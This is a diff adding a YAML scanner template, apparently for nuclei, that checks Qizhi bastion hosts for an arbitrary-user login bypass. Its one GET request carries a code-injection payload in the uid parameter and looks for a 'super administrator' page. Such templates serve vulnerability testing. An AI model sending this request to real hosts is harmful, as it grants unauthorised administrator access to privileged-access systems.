@@ -1,0 +1,21 @@
+id: qizhi-login-byPass
+info:
+  author: str1am
+  name: "\u9F50\u6CBB\u79D1\u6280\u8FD0\u7EF4\u64CD\u4F5C\u7BA1\u7406\u7CFB\u7EDF\uFF08\
+    \u5821\u5792\u673A\uFF09\u4EFB\u610F\u7528\u6237\u767B\u5F55"
+  reference:
+  - https://github.com/EdgeSecurityTeam/Vulnerability/blob/main/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86.md
+  severity: high
+  tags: qizhi,byPass
+requests:
+- matchers:
+  - type: word
+    words:
+    - "\u8D85\u7EA7\u7BA1\u7406\u5458"
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm'
